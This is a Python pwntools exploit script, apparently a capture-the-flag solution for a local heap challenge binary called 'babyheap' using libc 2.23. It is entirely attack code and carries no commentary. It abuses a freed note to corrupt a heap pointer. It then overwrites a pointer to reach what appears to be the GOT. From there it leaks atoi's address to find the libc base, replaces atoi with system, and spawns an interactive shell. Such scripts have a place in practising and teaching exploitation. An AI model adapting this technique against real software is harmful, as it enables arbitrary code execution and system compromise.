from pwn import *
context.log_level='debug'
def new():
  sh.sendlineafter("> ","1")

def edit(note):
  sh.sendlineafter("> ","2")
  sh.sendafter("Content? ",note)

def delete():
  sh.sendlineafter("> ","4")

def  show():
  sh.sendlineafter("> ","3")
  sh.recvuntil("Content: ")
  return sh.recvuntil("\n")

def  fill(note):
  sh.sendlineafter("> ","63")
  sh.sendafter("Fill ",note)

sh=process("./babyheap")
elf = ELF("./babyheap")
libc = ELF("libc-2.23.so")

new()
delete()
edit(p64(0x602095-8))
new()
fill('/bin/sh'+'\x00'*4+p64(0x602060)+'\x00'*0x20)
sh.sendline('3')
sh.recvuntil('Content: ')
libc_addr = u64(sh.recvuntil('\n')[:-1].ljust(8,'\x00'))-libc.symbols['atoi']
print "libc_addr : " + hex(libc_addr)
#gdb.attach(sh)
system_addr = libc_addr + libc.symbols['system']

edit(p64(system_addr))
#gdb.attach(sh)
sh.sendline('/bin/sh')
sh.interactive()
